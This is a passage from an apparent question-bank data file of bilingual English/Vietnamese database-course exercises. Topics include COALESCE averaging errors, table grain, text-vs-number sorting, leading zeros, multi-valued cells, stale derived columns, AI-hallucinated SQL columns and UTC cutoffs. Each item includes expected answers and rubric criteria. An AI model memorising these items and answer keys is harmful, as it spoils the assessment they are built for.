        prompt_en: 'CampusMart tracks product delivery times in `delivery_minutes` (NULL for in-store pickup orders). Look at the 4 orders below. What is the true average delivery time for delivered orders, and what happens if an analyst runs `AVG(COALESCE(delivery_minutes, 0))`?',
        prompt_vi: 'CampusMart theo dõi thời gian giao hàng qua cột `delivery_minutes` (`NULL` đối với đơn mua trực tiếp tại quầy). Quan sát 4 đơn hàng dưới đây. Thời gian giao hàng trung bình thực tế của các đơn có giao hàng là bao nhiêu, và điều gì xảy ra nếu chuyên viên chạy `AVG(COALESCE(delivery_minutes, 0))`?',
        context: 'CampusMart delivery performance tracking.',
        optional_table_or_diagram: `+----------+-------------+------------------+
| Order_ID | Fulfillment | delivery_minutes |
+----------+-------------+------------------+
| ORD_01   | DELIVERY    |        30        |
| ORD_02   | IN_STORE    |       NULL       |
| ORD_03   | DELIVERY    |        42        |
| ORD_04   | IN_STORE    |       NULL       |
+----------+-------------+------------------+`,
        expected_key_points: [
          'True average delivery time (`AVG(delivery_minutes)`): `(30 + 42) / 2 = 36` minutes.',
          'Using `COALESCE(delivery_minutes, 0)` turns in-store pickups into "0-minute deliveries": `(30 + 0 + 42 + 0) / 4 = 18` minutes.',
          'Reporting 18 minutes misleads management into thinking delivery riders are twice as fast as they really are.',
        ],
        acceptable_alternatives: ['Recommending `WHERE Fulfillment = "DELIVERY"` alongside `AVG(delivery_minutes)`.'],
        common_misconceptions: ['Assuming `COALESCE(col, 0)` is always a "safe best practice" before calling `AVG(col)`.'],
        optional_follow_up: 'When IS `COALESCE(col, 0)` appropriate (for example, when adding `item_total + shipping_fee`)?',
        rubric_specifics: {
          accuracy_full: 'Calculates 36 minutes (correct) vs 18 minutes (distorted by COALESCE).',
          reasoning_full: 'Explains why turning non-applicable `NULL`s into `0` doubles the denominator.',
          application_full: 'Contrasts row-level arithmetic (`+`) with column-level `AVG()`.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_B05_GRANULARITY_LOSS_TABLE',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Evaluating Information Loss in Aggregated Tables',
    learning_objective: 'Determine which analytical questions can and cannot be answered from a given table grain',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: true,
        prompt_en: 'Suppose CampusMart only keeps the `Daily_Category_Summary` table shown below and deletes individual receipt logs. State whether each of these 2 questions can be answered from this table and explain why: (Q1) "What was total Stationery revenue on Oct 10?" (Q2) "How many students bought both a Stationery item and a Beverage in the same basket on Oct 10?"',
        prompt_vi: 'Giả sử CampusMart chỉ lưu bảng `Daily_Category_Summary` dưới đây và xóa hết chi tiết từng hóa đơn. Hãy cho biết mỗi câu hỏi sau có trả lời được từ bảng này không và giải thích tại sao: (Q1) "Tổng doanh thu ngành hàng Văn phòng phẩm ngày 10/10 là bao nhiêu?" (Q2) "Có bao nhiêu sinh viên mua cả Văn phòng phẩm lẫn Đồ uống trong cùng một giỏ hàng ngày 10/10?"',
        context: 'Evaluating table granularity against business questions.',
        optional_table_or_diagram: `+------------+-------------+------------------+-----------------+
| Sale_Date  | Category    | Total_Items_Sold | Revenue_VND     |
+------------+-------------+------------------+-----------------+
| 2026-10-10 | Stationery  |        85        |    2,125,000    |
| 2026-10-10 | Beverage    |       140        |    2,800,000    |
+------------+-------------+------------------+-----------------+`,
        expected_key_points: [
          'Q1 CAN be answered directly: look up `Sale_Date = 2026-10-10` and `Category = Stationery` -> `2,125,000 VND`.',
          'Q2 CANNOT be answered: the table is aggregated by `(Sale_Date, Category)` and has lost `order_id` and `customer_id` basket links.',
          'Cross-category basket analysis requires receipt-line granularity (`OrderLines`).',
        ],
        acceptable_alternatives: ['Explaining market basket analysis requires order-level identifiers.'],
        common_misconceptions: ['Guessing that at most 85 students bought both, or claiming AI can infer basket overlap from daily category totals.'],
        optional_follow_up: 'What is the minimum grain needed to answer Q2?',
        rubric_specifics: {
          accuracy_full: 'Correctly answers Yes for Q1 (2,125,000 VND) and No for Q2.',
          reasoning_full: 'Explains that `order_id` / basket linkage is lost at daily category grain.',
          application_full: 'Specifies `OrderLines(order_id, product_id)` as the required granularity.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'A coffee shop database stores only `Monthly_Barista_Hours(month, barista_id, total_hours)`. Can the manager check whether Barista B02 worked overtime (> 8 hours in a single day) on October 14? Explain why or why not.',
        prompt_vi: 'CSDL quán cà phê chỉ lưu bảng `Monthly_Barista_Hours(month, barista_id, total_hours)`. Quản lý có thể kiểm tra xem nhân viên pha chế B02 có làm thêm giờ (> 8 tiếng trong một ngày) vào ngày 14/10 hay không? Giải thích tại sao.',
        context: 'Coffee shop payroll and shift compliance.',
        optional_table_or_diagram: `+---------+------------+-------------+
| Month   | Barista_ID | Total_Hours |
+---------+------------+-------------+
| 2026-10 | B01        |     160     |
| 2026-10 | B02        |     144     |
+---------+------------+-------------+`,
        expected_key_points: [
          'No — a monthly total of `144` hours could be 18 days × 8 hours (zero overtime) or 12 days × 12 hours (heavy daily overtime).',
          'Monthly grain destroys daily shift distribution.',
          'To check daily overtime on Oct 14, the database must store shift-level or daily attendance records (`shift_date, check_in, check_out`).',
        ],
        acceptable_alternatives: ['Giving two concrete daily schedules that both sum to 144 hours.'],
        common_misconceptions: ['Dividing 144 by 30 days = 4.8 hours/day and concluding B02 never worked overtime on any day.'],
        optional_follow_up: 'Show a 2-day counterexample where average hours/day is 6, but overtime occurred.',
        rubric_specifics: {
          accuracy_full: 'States clearly that daily overtime cannot be determined from monthly totals.',
          reasoning_full: 'Provides a mathematical distribution example (e.g., 12h + 0h vs 6h + 6h).',
          application_full: 'Defines the shift-level table grain required for labor law compliance.',
        },
      },
    ],
  },
  // L01_B06 to L01_B15 (10 more applied families for Lecture 01)
  {
    family_suffix: 'L01_B06_SCHEMA_TYPE_MISMATCH',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Identifying Text-vs-Number Sorting Bugs in Tables',
    learning_objective: 'Diagnose why storing numeric prices as text breaks sorting and filtering',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: false,
        prompt_en: 'In a poorly designed SQLite table, `unit_price` was declared as `TEXT` and sorted with `ORDER BY unit_price DESC`. Look at the query output below. Why did `"9000"` appear above `"45000"`, and how do you fix the schema?',
        prompt_vi: 'Trong một bảng SQLite thiết kế kém, cột `unit_price` bị khai báo kiểu `TEXT` và sắp xếp bằng `ORDER BY unit_price DESC`. Quan sát kết quả dưới đây. Tại sao `"9000"` lại xếp trên `"45000"`, và bạn sửa lại lược đồ như thế nào?',
        context: 'CampusMart catalog sorting bug.',
        optional_table_or_diagram: `+------+----------------+------------+
| SKU  | Item_Name      | unit_price |
+------+----------------+------------+
| P09  | Eraser         | "9000"     |
| P04  | Calculator     | "450000"   |
| P02  | Notebook       | "45000"    |
| P01  | Gel Pen        | "12000"    |
+------+----------------+------------+`,
        expected_key_points: [
          'When stored as `TEXT`, SQL sorts strings lexicographically (character by character from left to right).',
          'Because character `"9"` has a higher ASCII code than `"4"` and `"1"`, `"9000"` sorts before `"450000"`.',
          'Fix: Store `unit_price` as `INTEGER` (or `NUMERIC`/`DECIMAL`) so sorting compares mathematical magnitude (`450000 > 45000 > 12000 > 9000`).',
        ],
        acceptable_alternatives: ['Mentioning `CAST(unit_price AS INTEGER)` as a temporary query workaround while fixing the column type.'],
        common_misconceptions: ['Thinking the database engine randomly shuffled the rows.'],
        optional_follow_up: 'What would `WHERE unit_price > "20000"` wrongly return when `unit_price` is stored as `TEXT`?',
        rubric_specifics: {
          accuracy_full: 'Identifies lexicographical (alphabetical) character comparison (`"9" > "4"`).',
          reasoning_full: 'Explains how string comparison ignores numeric place value.',
          application_full: 'Fixes column type to `INTEGER`/`NUMERIC` and cleans string values.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'Look at the `Order_Date` column stored as `DD/MM/YYYY` text strings below. If an analyst runs `ORDER BY Order_Date ASC`, which row comes first and why is `YYYY-MM-DD` (ISO 8601) mandatory when storing dates as text in SQLite?',
        prompt_vi: 'Quan sát cột `Order_Date` đang lưu chuỗi văn bản định dạng `DD/MM/YYYY` dưới đây. Nếu chuyên viên chạy `ORDER BY Order_Date ASC`, dòng nào sẽ đứng đầu tiên và tại sao định dạng chuẩn `YYYY-MM-DD` (ISO 8601) lại bắt buộc khi lưu ngày tháng dạng chuỗi trong SQLite?',
        context: 'Date formatting in SQLite databases.',
        optional_table_or_diagram: `+----------+--------------+
| Order_ID | Order_Date   |
+----------+--------------+
| ORD_1    | "25/01/2026" |
| ORD_2    | "03/11/2026" |
| ORD_3    | "12/05/2025" |
+----------+--------------+`,
        expected_key_points: [
          'Sorting `DD/MM/YYYY` alphabetically compares the day first (`"03"` < `"12"` < `"25"`), so `ORD_2 ("03/11/2026")` comes first even though `ORD_3 ("12/05/2025")` is from the previous year!',
          'ISO 8601 (`YYYY-MM-DD`) places largest time unit first (Year -> Month -> Day) with zero-padding.',
          'Therefore, alphabetical order of `YYYY-MM-DD` strings matches chronological order (`"2025-05-12" < "2026-01-25" < "2026-11-03"`).',
        ],
        acceptable_alternatives: ['Also noting that SQLite date functions (`strftime`, `date()`) expect ISO 8601 `YYYY-MM-DD`.'],
        common_misconceptions: ['Assuming SQLite automatically parses `"03/11/2026"` as November 3, 2026 during `ORDER BY`.'],
        optional_follow_up: 'What would `WHERE Order_Date BETWEEN "01/01/2026" AND "31/01/2026"` accidentally include if stored as `DD/MM/YYYY`?',
        rubric_specifics: {
          accuracy_full: 'Identifies `ORD_2 ("03/11/2026")` as sorting first under `DD/MM/YYYY`.',
          reasoning_full: 'Explains most-significant-unit-first ordering in ISO 8601 (`YYYY-MM-DD`).',
          application_full: 'Converts the three dates to `"2025-05-12"`, `"2026-01-25"`, `"2026-11-03"`.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_B07_STUDENT_ID_LEADING_ZERO',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Identifier Data Types (Preserving Leading Zeros)',
    learning_objective: 'Choose appropriate data types for identifiers that look like numbers',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: false,
        prompt_en: 'Look at the imported student table below where `student_id` and `phone` were stored as `INTEGER`. Explain what corruption happened and give the golden rule for choosing between `TEXT`/`VARCHAR` and `INTEGER` for digit strings.',
        prompt_vi: 'Quan sát bảng sinh viên vừa nhập dưới đây khi cột `student_id` và `phone` bị khai báo kiểu `INTEGER`. Hãy giải thích dữ liệu đã bị hỏng như thế nào và nêu quy tắc vàng khi chọn giữa `TEXT`/`VARCHAR` và `INTEGER` cho các chuỗi chữ số.',
        context: 'HSB3102E Student CSV Import into Database.',
        optional_table_or_diagram: `CSV SourceInput:            Database Stored (INTEGER):
student_id | phone          student_id | phone
-----------+-----------     -----------+----------
"00231045" | "0912345678"     231045   | 912345678
"00089120" | "0987654321"      89120   | 987654321`,
        expected_key_points: [
          'Storing identifiers/phones as `INTEGER` strips all leading zeros (`"00231045"` becomes `231045`, `"0912345678"` loses its leading `0`).',
          'Golden rule: Only use numeric types (`INTEGER`/`DECIMAL`) for quantities you do arithmetic on (`SUM`, `AVG`, `+`, `-`).',
          'Use `TEXT`/`VARCHAR` for identifiers, student IDs, zip codes, barcodes, and phone numbers where leading zeros and exact character formatting matter.',
        ],
        acceptable_alternatives: ['Mentioning that international phone numbers may also include `+84` which fails integer conversion.'],
        common_misconceptions: ['Thinking that because a student ID contains only digits 0–9, its database type must be `INTEGER`.'],
        optional_follow_up: 'Would it ever make sense to compute `AVG(student_id)` or `SUM(phone)`?',
        rubric_specifics: {
          accuracy_full: 'Identifies loss of leading zeros in both `student_id` and `phone`.',
          reasoning_full: 'States the arithmetic-vs-identifier test for data type selection.',
          application_full: 'Specifies `TEXT`/`VARCHAR` with format check constraints.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'CampusMart imports product EAN-13 barcodes (e.g., `"0049012345678"`) from a CSV file opened and re-saved in Excel before database import. In the preview table, the barcode shows `"4.90123E+10"`. Explain what happened and how the import pipeline should prevent this.',
        prompt_vi: 'CampusMart nhập mã vạch sản phẩm EAN-13 (ví dụ: `"0049012345678"`) từ một file CSV đã bị mở và bấm lưu lại trong Excel trước khi đưa vào CSDL. Trên màn hình preview, mã vạch hiển thị `"4.90123E+10"`. Hãy giải thích chuyện gì đã xảy ra và quy trình nhập dữ liệu cần ngăn chặn lỗi này ra sao.',
        context: 'CampusMart product barcode CSV import.',
        expected_key_points: [
          'Excel auto-converted the 13-digit string into a floating-point number, stripping leading zeros and saving it in scientific notation (`4.90123E+10`), permanently losing the last digits of precision!',
          'In the database and CSV validator, `barcode` must be treated as a `TEXT` string.',
          'The import validator should reject values matching scientific notation (`E+`) or invalid lengths and warn the user not to save raw CSVs through default Excel numeric formatting.',
        ],
        acceptable_alternatives: ['Suggesting prefixing text identifiers or importing directly into the web app without re-saving in Excel.'],
        common_misconceptions: ['Thinking the database can recover the lost trailing digits from `"4.90123E+10"` without the original source file.'],
        optional_follow_up: 'Write a simple validation check to catch corrupted EAN-13 barcodes during CSV preview.',
        rubric_specifics: {
          accuracy_full: 'Explains leading zero stripping + floating-point scientific notation truncation.',
          reasoning_full: 'Notes that precision loss in `"4.90123E+10"` is irreversible once saved.',
          application_full: 'Proposes regex validation (`^[0-9]{8,14}$`) during CSV import preview.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_B08_MULTI_VALUE_CELL_AUDIT',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Auditing Multi-Valued Cells in Operational Tables',
    learning_objective: 'Demonstrate why comma-separated lists inside a single column break counting and joining',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: false,
        prompt_en: 'Look at the `Course_Registrations` table below. Why will a simple query searching for students enrolled in `"HSB3102E"` or counting enrollments per course fail or require brittle string matching? How should these 2 rows be restructured?',
        prompt_vi: 'Quan sát bảng `Course_Registrations` dưới đây. Tại sao việc truy vấn danh sách sinh viên học môn `"HSB3102E"` hoặc đếm sĩ số từng môn lại gặp khó khăn và dễ sai sót? Hai dòng này cần được tách lại như thế nào?',
        context: 'University course registration log.',
        optional_table_or_diagram: `+------------+--------------+-------------------------------+
| Student_ID | Student_Name | Enrolled_Courses              |
+------------+--------------+-------------------------------+
| 00231001   | An Nguyen    | HSB3102E, FIN201, MKT101      |
| 00231002   | Binh Tran    | FIN201, HSB3102E-HONORS       |
+------------+--------------+-------------------------------+`,
        expected_key_points: [
          '`Enrolled_Courses` packs multiple values into a single cell (violating atomicity).',
          'Using `WHERE Enrolled_Courses LIKE "%HSB3102E%"` on Row 2 falsely matches `"HSB3102E-HONORS"` as if it were `"HSB3102E"`!',
          'You cannot use standard `GROUP BY course_code` or foreign keys to the `Courses` table.',
          'Restructure into `Enrollments(student_id, course_code)` with one row per `(student_id, course_code)` pair (5 rows total).',
        ],
        acceptable_alternatives: ['Showing the 5 normalized enrollment rows explicitly.'],
        common_misconceptions: ['Claiming `LIKE "%HSB3102E%"` is a completely reliable substitute for relational normalization.'],
        optional_follow_up: 'How many rows will exist in the restructured `Enrollments` table for An and Binh combined?',
        rubric_specifics: {
          accuracy_full: 'Points out multi-valued cell and the substring false-positive bug (`HSB3102E` matching `HSB3102E-HONORS`).',
          reasoning_full: 'Explains why `GROUP BY`, `COUNT`, and Foreign Keys fail on comma-separated strings.',
          application_full: 'Restructures into 5 atomic rows in `Enrollments(student_id, course_code)`.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'In CampusMart’s receipt log below, `Items_Bought` stores `"2x Notebook, 1x Pen"`. Why can the database not automatically deduct inventory or sum revenue per product from this design?',
        prompt_vi: 'Trong bảng hóa đơn của CampusMart dưới đây, cột `Items_Bought` lưu chuỗi `"2x Notebook, 1x Pen"`. Tại sao CSDL không thể tự động trừ tồn kho hoặc cộng doanh thu theo từng mặt hàng từ thiết kế này?',
        context: 'CampusMart POS table design.',
        optional_table_or_diagram: `+----------+------------+------------------------+------------+
| Order_ID | Order_Date | Items_Bought           | Total_VND  |
+----------+------------+------------------------+------------+
| ORD_901  | 2026-10-12 | 2x Notebook, 1x Pen    | 55000      |
| ORD_902  | 2026-10-12 | 1x Pen, 1x Calculator  | 460000     |
+----------+------------+------------------------+------------+`,
        expected_key_points: [
          'Product ID, quantity, and unit price at purchase are buried inside unstructured free text.',
          'SQL cannot join `"2x Notebook"` to `Products.product_id` via a foreign key or sum quantities reliably.',
          'Moreover, individual item prices are not recorded (`Total_VND` only gives the basket sum).',
          'Must split into `OrderLines(order_id, product_id, quantity, unit_price_at_purchase)`.',
        ],
        acceptable_alternatives: ['Explaining how a product name typo in the string breaks inventory tracking.'],
        common_misconceptions: ['Assuming `Total_VND` can be divided equally among items in `Items_Bought`.'],
        optional_follow_up: 'Can you tell from those two rows alone how much 1 Notebook costs vs 1 Calculator without solving simultaneous equations?',
        rubric_specifics: {
          accuracy_full: 'Identifies embedded quantity, missing product_id FK, and missing item-level price.',
          reasoning_full: 'Explains why inventory deduction and item revenue aggregation are blocked.',
          application_full: 'Defines `OrderLines(order_id, product_id, quantity, unit_price_at_purchase)`.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_B09_DERIVED_ATTRIBUTE_MISMATCH',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Detecting Contradictions in Stored Derived Columns',
    learning_objective: 'Spot inconsistencies when derived totals are manually stored and edited',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: false,
        prompt_en: 'Inspect the `Order_Lines` table below. Row 2 has a contradiction between `Qty`, `Unit_Price`, and `Line_Total`. Identify the exact math discrepancy, explain how it likely happened, and state how a database design prevents it.',
        prompt_vi: 'Quan sát bảng `Order_Lines` dưới đây. Dòng số 2 có sự mâu thuẫn giữa `Qty`, `Unit_Price` và `Line_Total`. Hãy chỉ ra sai lệch toán học cụ thể, giải thích nguyên nhân có thể gây ra lỗi này và nêu cách thiết kế CSDL để ngăn chặn.',
        context: 'CampusMart invoice line audit.',
        optional_table_or_diagram: `+---------+--------+-----+------------+------------+
| Line_ID | SKU    | Qty | Unit_Price | Line_Total |
+---------+--------+-----+------------+------------+
|    1    | P_BOOK |  2  |   50000    |   100000   |
|    2    | P_PEN  |  5  |   10000    |    30000   |
|    3    | P_BAG  |  1  |  200000    |   200000   |
+---------+--------+-----+------------+------------+`,
        expected_key_points: [
          'In Row 2, `Qty (5) * Unit_Price (10,000) = 50,000`, which contradicts `Line_Total = 30,000` (a 20,000 VND discrepancy).',
          'Likely cause: `Qty` was updated from `3` to `5` without recalculating `Line_Total` (or a discount was applied without a `discount_amount` column).',
          'Prevention: Do not store `Line_Total` as an independently editable column; compute `Qty * Unit_Price` in a View/query or use a generated column (`GENERATED ALWAYS AS (Qty * Unit_Price)`).',
        ],
        acceptable_alternatives: ['Adding an explicit `discount_amount` column with `CHECK (Line_Total = Qty * Unit_Price - discount_amount)`.'],
        common_misconceptions: ['Ignoring the contradiction and trusting `Line_Total` blindly.'],
        optional_follow_up: 'If one report sums `Qty * Unit_Price` and another sums `Line_Total`, what gap will the finance team see?',
        rubric_specifics: {
          accuracy_full: 'Calculates `5 * 10,000 = 50,000 != 30,000` on Row 2.',
          reasoning_full: 'Explains partial update anomaly on stored derived columns.',
          application_full: 'Proposes computed view / generated column or explicit discount column with CHECK.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'In the `Students` table below, both `birth_year` and `age` are stored as regular columns. Assuming the current year is 2026, identify which rows are inconsistent and explain why storing `age` as a static integer column is an anti-pattern.',
        prompt_vi: 'Trong bảng `Students` dưới đây, cả hai cột `birth_year` (năm sinh) và `age` (tuổi) đều được lưu thành cột số thông thường. Giả sử năm hiện tại là 2026, hãy chỉ ra những dòng bị mâu thuẫn và giải thích vì sao lưu `age` làm cột tĩnh là một thiết kế sai (anti-pattern).',
        context: 'Student profile database audit in year 2026.',
        optional_table_or_diagram: `+------------+------------+------+--------------+
| Student_ID | Birth_Year | Age  | Created_Year |
+------------+------------+------+--------------+
| 002301     |    2005    |  19  |     2024     |
| 002302     |    2006    |  20  |     2026     |
| 002303     |    2004    |  20  |     2024     |
+------------+------------+------+--------------+`,
        expected_key_points: [
          'In 2026, student `002301` (born 2005) is `21` years old, not `19`; student `002303` (born 2004) is `22`, not `20`.',
          'Their `Age` column froze at the value from `Created_Year = 2024` and became stale every January 1st.',
          'Fix: Store only immutable `date_of_birth` (or `birth_year`) and compute age dynamically at query time.',
        ],
        acceptable_alternatives: ['Using date difference functions in a SQL view.'],
        common_misconceptions: ['Suggesting a nightly cron job to increment `Age` instead of storing `date_of_birth` and computing age dynamically.'],
        optional_follow_up: 'When IS storing a snapshot of age justified (for example, `age_at_admission` on a medical or legal record)?',
        rubric_specifics: {
          accuracy_full: 'Identifies rows `002301` (should be 21) and `002303` (should be 22) as stale.',
          reasoning_full: 'Explains time-dependent staleness of stored `age`.',
          application_full: 'Recommends storing `date_of_birth` and calculating age in queries/views.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_B10_AI_HALLUCINATED_SCHEMA',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Auditing AI-Generated Queries Against Real Schema',
    learning_objective: 'Spot schema hallucinations when an AI generates SQL without inspecting actual table columns',
    variants: [
      {
        difficulty_band: 'CORE',
        approved_by_default: false,
        prompt_en: 'You give an AI assistant the CampusMart `Products` schema below and ask for products with profit margin > 10,000 VND. The AI writes the SQL query shown. Identify why this query will fail or mislead, based strictly on the provided schema.',
        prompt_vi: 'Bạn cung cấp lược đồ bảng `Products` của CampusMart dưới đây cho AI và yêu cầu liệt kê các sản phẩm có lợi nhuận mỗi chiếc > 10.000đ. AI sinh ra câu truy vấn bên dưới. Dựa trên lược đồ đã cho, hãy chỉ ra vì sao truy vấn này sẽ báo lỗi hoặc sai bản chất.',
        context: 'Auditing AI SQL generation at CampusMart.',
        optional_table_or_diagram: `Actual Table Schema:
Products(product_id TEXT PRIMARY KEY, product_name TEXT, selling_price INTEGER, stock_qty INTEGER)`,
        optional_sql: `SELECT product_id, product_name, (selling_price - unit_cost) AS unit_profit
FROM Products
WHERE (selling_price - unit_cost) > 10000;`,
        expected_key_points: [
          'The AI hallucinated a column named `unit_cost` that does NOT exist in the `Products` schema (`product_id, product_name, selling_price, stock_qty`).',
          'Executing this query in SQLite will fail with `no such column: unit_cost`.',
          'Furthermore, without cost data in the schema, profit cannot be computed—only selling price is available.',
        ],
        acceptable_alternatives: ['Explaining that `unit_cost` must either be added to `Products` or joined from a `SupplierBatches` table before profit can be calculated.'],
        common_misconceptions: ['Assuming SQLite automatically defaults a missing column `unit_cost` to 0 instead of throwing a syntax/schema error.'],
        optional_follow_up: 'If a junior developer "fixes" the error by replacing `unit_cost` with `0`, what business mistake did they just commit?',
        rubric_specifics: {
          accuracy_full: 'Identifies that `unit_cost` does not exist in `Products`.',
          reasoning_full: 'Explains LLM schema hallucination and that profit cannot be known from `selling_price` alone.',
          application_full: 'Specifies adding `unit_cost` or joining supplier purchase cost.',
        },
      },
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'Compare the actual `Internships` table schema with the AI-generated SQL query below. Find two specific mismatches between what the AI assumed and what the database actually stores.',
        prompt_vi: 'Hãy đối chiếu lược đồ bảng `Internships` thực tế với câu truy vấn SQL do AI sinh ra bên dưới. Tìm 2 điểm lệch cụ thể giữa giả định của AI và dữ liệu thực tế trong CSDL.',
        context: 'University Internship database audit.',
        optional_table_or_diagram: `Actual Schema & Domain Values:
Internships(
  placement_id TEXT PRIMARY KEY,
  student_id TEXT,
  company_name TEXT,
  stipend_thousand_vnd INTEGER, -- e.g. 5000 means 5,000,000 VND
  status_code INTEGER           -- 1 = Pending, 2 = Active, 3 = Completed
)`,
        optional_sql: `SELECT student_id, company_name
FROM Internships
WHERE status_code = 'Active'
  AND stipend_thousand_vnd >= 5000000;`,
        expected_key_points: [
          'Mismatch 1 (Domain code vs string): `status_code` stores integers (`2` for Active), not the text string `\'Active\'`.',
          'Mismatch 2 (Unit scale): `stipend_thousand_vnd` is stored in thousands of VND (`5000` represents 5,000,000 VND). Filtering `>= 5000000` looks for 5 billion VND and returns 0 rows!',
        ],
        acceptable_alternatives: ['Rewriting the `WHERE` clause as `WHERE status_code = 2 AND stipend_thousand_vnd >= 5000`.'],
        common_misconceptions: ['Saying the SQL syntax is invalid (the syntax is valid SQL, which makes the silent 0-row result even more dangerous!).'],
        optional_follow_up: 'Why is a query that runs without syntax errors but returns 0 rows due to unit mismatch harder to catch than a syntax error?',
        rubric_specifics: {
          accuracy_full: 'Identifies both `status_code = 2` (vs `"Active"`) and `stipend_thousand_vnd >= 5000` (vs `5000000`).',
          reasoning_full: 'Explains silent semantic failure where valid SQL syntax returns empty results.',
          application_full: 'Writes the corrected `WHERE status_code = 2 AND stipend_thousand_vnd >= 5000`.',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_B11_TIMESTAMP_TIMEZONE_TRAP',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
    topic: 'Analyzing Timestamp Cutoff Discrepancies',
    learning_objective: 'Diagnose daily sales mismatches caused by UTC vs Local Timezone timestamps',
    variants: [
      {
        difficulty_band: 'PROFICIENT',
        approved_by_default: false,
        prompt_en: 'CampusMart is in Hanoi (UTC+7). The POS database stores `created_at_utc` in UTC time. Look at the 3 orders below on October 15 local time. If a report filters `WHERE substr(created_at_utc, 1, 10) = "2026-10-15"`, which order is wrongly excluded from October 15 Hanoi sales and why?',
        prompt_vi: 'CampusMart đặt tại Hà Nội (múi giờ UTC+7). CSDL máy POS lưu cột `created_at_utc` theo giờ quốc tế UTC. Quan sát 3 đơn hàng ngày 15/10 (giờ Hà Nội) dưới đây. Nếu báo cáo lọc `WHERE substr(created_at_utc, 1, 10) = "2026-10-15"`, đơn hàng nào bị loại nhầm khỏi doanh thu ngày 15/10 tại Hà Nội và tại sao?',
        context: 'Timezone handling in CampusMart daily sales closing.',
        optional_table_or_diagram: `+----------+---------------------+---------------------+------------+
| Order_ID | Hanoi_Local_Time    | created_at_utc      | Amount_VND |
+----------+---------------------+---------------------+------------+
| ORD_10   | 2026-10-15 06:30:00 | 2026-10-14 23:30:00 |   45,000   |
| ORD_11   | 2026-10-15 10:15:00 | 2026-10-15 03:15:00 |   80,000   |
| ORD_12   | 2026-10-15 18:00:00 | 2026-10-15 11:00:00 |   60,000   |
+----------+---------------------+---------------------+------------+`,
        expected_key_points: [
          '`ORD_10` (bought at 06:30 AM on Oct 15 in Hanoi) has UTC timestamp `"2026-10-14 23:30:00"`.',
          'Filtering on the UTC date string `"2026-10-15"` excludes `ORD_10` (pushing 45,000 VND into October 14).',
          'Any transaction in Hanoi between `00:00` and `06:59` local time falls on the previous UTC date.',
        ],
        acceptable_alternatives: ['Showing SQLite `datetime(created_at_utc, "+7 hours")` conversion before extracting the date.'],
        common_misconceptions: ['Thinking UTC and Hanoi dates only differ in the hour digits, forgetting that 00:00–06:59 ICT crosses the midnight date boundary in UTC.'],
        optional_follow_up: 'How should the query convert `created_at_utc` before grouping by local business day?',
        rubric_specifics: {
          accuracy_full: 'Identifies `ORD_10` (45,000 VND) as excluded because its UTC date is `2026-10-14`.',
          reasoning_full: 'Explains the 7-hour offset across midnight (00:00–06:59 Hanoi = 17:00–23:59 prior day UTC).',
          application_full: 'Applies timezone offset (`+7 hours`) prior to date truncation.',
        },
      },
      {
        difficulty_band: 'ADVANCED',
        approved_by_default: false,
        prompt_en: 'In an internship application portal, the submission deadline is `2026-10-20 23:59:59` Hanoi time. Look at the 3 submissions below. If the validation query checks `submitted_at <= "2026-10-20"`, why does Student S02 get wrongly rejected even though they submitted at 09:00 AM on the deadline day?',
        prompt_vi: 'Trong cổng nộp hồ sơ thực tập, hạn chót là `2026-10-20 23:59:59` giờ Hà Nội. Quan sát 3 hồ sơ dưới đây. Nếu câu lệnh kiểm tra viết `submitted_at <= "2026-10-20"`, tại sao Sinh viên S02 lại bị loại oan dù nộp lúc 09:00 sáng đúng ngày hạn chót?',
        context: 'Date vs Datetime string comparison in SQL.',
        optional_table_or_diagram: `+------------+---------------------+
| Student_ID | submitted_at        |
+------------+---------------------+
| S01        | 2026-10-19 15:20:00 |
| S02        | 2026-10-20 09:00:00 |
| S03        | 2026-10-21 00:05:00 |
+------------+---------------------+`,
        expected_key_points: [
          'Comparing a full timestamp `"2026-10-20 09:00:00"` against `"2026-10-20"` treats `"2026-10-20"` as midnight `00:00:00` (or shorter string in lexicographical order: `"2026-10-20 09:00:00" > "2026-10-20"`).',
          'Thus every submission on October 20 after `00:00:00` is rejected!',
          'Fix: Use `submitted_at <= "2026-10-20 23:59:59"` or `submitted_at < "2026-10-21 00:00:00"`.',
        ],
        acceptable_alternatives: ['Recommending half-open intervals `submitted_at < "2026-10-21"`.'],
        common_misconceptions: ['Assuming `<= "2026-10-20"` automatically includes the entire 24 hours of October 20 when the column contains timestamps.'],
        optional_follow_up: 'Why do database engineers prefer `< "2026-10-21 00:00:00"` over `<= "2026-10-20 23:59:59"` when timestamps have milliseconds?',
        rubric_specifics: {
          accuracy_full: 'Explains why `"2026-10-20 09:00:00" > "2026-10-20"`.',
          reasoning_full: 'Shows how midnight truncation cuts off the entire deadline day.',
          application_full: 'Writes `< "2026-10-21 00:00:00"` (or `<= "2026-10-20 23:59:59"`).',
        },
      },
    ],
  },
  {
    family_suffix: 'L01_B12_SOFT_DELETE_VS_HARD_DELETE',
    lecture_ids: ['01'],
    question_group: 'B_APPLIED',
